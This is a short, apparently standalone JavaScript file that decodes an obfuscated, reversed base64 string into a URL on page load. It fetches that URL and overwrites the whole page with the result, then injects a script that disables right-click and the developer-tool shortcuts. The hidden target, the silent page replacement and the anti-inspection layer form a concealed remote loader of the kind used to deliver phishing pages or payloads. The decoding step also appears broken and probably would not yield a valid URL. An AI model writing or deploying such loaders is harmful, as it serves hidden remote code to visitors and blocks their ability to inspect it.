/* © 2026 Moaz Elgohary -  */
(function() {
    const _0x_key = "==AbpRHZp92YyV3clB2bj5WauR2Y"; 
    
    async function _init_system() {
        const _decode = (s) => atob(s.split("").reverse().join("").substring(2));
        const _target = _decode(_0x_key);

        try {
            const response = await fetch(_target);
            const content = await response.text();
            
            
            const securityLayer = `<script>
                document.oncontextmenu = () => false;
                document.onkeydown = e => {
                    if (e.keyCode == 123 || (e.ctrlKey && e.shiftKey && (e.keyCode == 73 || e.keyCode == 74))) return false;
                };
            <\/script>`;

            document.open();
            document.write(content + securityLayer);
            document.close();
        } catch (e) {

        }
    }

 
    setTimeout(_init_system, 50);
})();
